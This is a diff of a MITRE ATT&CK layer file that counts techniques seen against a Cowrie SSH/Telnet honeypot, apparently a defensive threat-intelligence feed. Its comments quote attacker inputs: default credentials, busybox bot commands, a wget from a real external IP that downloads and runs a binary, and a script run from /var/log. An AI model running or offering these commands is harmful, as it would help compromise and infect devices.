@@ -6,7 +6,7 @@
     "layer": "4.5"
   },
   "domain": "enterprise-attack",
-  "description": "Techniques observed against a Cowrie SSH/Telnet honeypot. Score is the number of times each technique was observed. Generated 2026-10-11 16:03:55",
+  "description": "Techniques observed against a Cowrie SSH/Telnet honeypot. Score is the number of times each technique was observed. Generated 2026-10-11 17:04:56",
   "filters": {
     "platforms": [
       "Linux"
@@ -22,9 +22,9 @@
   "techniques": [
     {
       "techniqueID": "T1110.001",
-      "score": 419317,
+      "score": 419440,
       "enabled": true,
-      "comment": "419317 observation(s) from 6281 unique IP(s). e.g. root / 123456",
+      "comment": "419440 observation(s) from 6289 unique IP(s). e.g. root / 123456",
       "metadata": [
         {
           "name": "tactic",
@@ -32,7 +32,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "6281"
+          "value": "6289"
         },
         {
           "name": "first seen",
@@ -40,15 +40,15 @@
         },
         {
           "name": "last seen",
-          "value": "2026-10-11T16:03:54"
+          "value": "2026-10-11T17:04:55"
         }
       ]
     },
     {
       "techniqueID": "T1078",
-      "score": 62817,
+      "score": 62829,
       "enabled": true,
-      "comment": "62817 observation(s) from 5099 unique IP(s). e.g. root / admin",
+      "comment": "62829 observation(s) from 5105 unique IP(s). e.g. root / admin",
       "metadata": [
         {
           "name": "tactic",
@@ -56,7 +56,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "5099"
+          "value": "5105"
         },
         {
           "name": "first seen",
@@ -64,7 +64,7 @@
         },
         {
           "name": "last seen",
-          "value": "2026-10-11T16:03:11"
+          "value": "2026-10-11T17:03:53"
         }
       ]
     },
@@ -94,9 +94,9 @@
     },
     {
       "techniqueID": "T1222.002",
-      "score": 21058,
+      "score": 21094,
       "enabled": true,
-      "comment": "21058 observation(s) from 1758 unique IP(s). e.g. /bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI",
+      "comment": "21094 observation(s) from 1759 unique IP(s). e.g. /bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI",
       "metadata": [
         {
           "name": "tactic",
@@ -104,7 +104,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "1758"
+          "value": "1759"
         },
         {
           "name": "first seen",
@@ -112,15 +112,15 @@
         },
         {
           "name": "last seen",
-          "value": "2026-10-11T16:03:13"
+          "value": "2026-10-11T16:55:30"
         }
       ]
     },
     {
       "techniqueID": "T1105",
-      "score": 8297,
+      "score": 8354,
       "enabled": true,
-      "comment": "8297 observation(s) from 1635 unique IP(s). e.g. (wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+      "comment": "8354 observation(s) from 1637 unique IP(s). e.g. (wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
       "metadata": [
         {
           "name": "tactic",
@@ -128,7 +128,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "1635"
+          "value": "1637"
         },
         {
           "name": "first seen",
@@ -136,7 +136,7 @@
         },
         {
           "name": "last seen",
-          "value": "2026-10-11T16:03:16"
+          "value": "2026-10-11T17:04:24"
         }
       ]
     },
@@ -477,6 +477,30 @@
       ]
     },
     {
+      "techniqueID": "T1070.002",
+      "score": 6,
+      "enabled": true,
+      "comment": "6 observation(s) from 4 unique IP(s). e.g. /bin/busybox echo > /var/log/.b && sh /var/log/.b && cd /var/log/",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Defense Evasion"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "4"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-10-11T02:43:06"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-10-11T17:04:23"
+        }
+      ]
+    },
+    {
       "techniqueID": "T1018",
       "score": 3,
       "enabled": true,
@@ -497,30 +521,6 @@
         {
           "name": "last seen",
           "value": "2026-09-30T16:42:43"
-        }
-      ]
-    },
-    {
-      "techniqueID": "T1070.002",
-      "score": 3,
-      "enabled": true,
-      "comment": "3 observation(s) from 2 unique IP(s). e.g. /bin/busybox echo > /var/log/.b && sh /var/log/.b && cd /var/log/",
-      "metadata": [
-        {
-          "name": "tactic",
-          "value": "Defense Evasion"
-        },
-        {
-          "name": "unique source IPs",
-          "value": "2"
-        },
-        {
-          "name": "first seen",
-          "value": "2026-10-11T02:43:06"
-        },
-        {
-          "name": "last seen",
-          "value": "2026-10-11T07:00:09"
         }
       ]
     },
@@ -556,7 +556,7 @@
       "#f85149"
     ],
     "minValue": 0,
-    "maxValue": 419317
+    "maxValue": 419440
   },
   "legendItems": [
     {
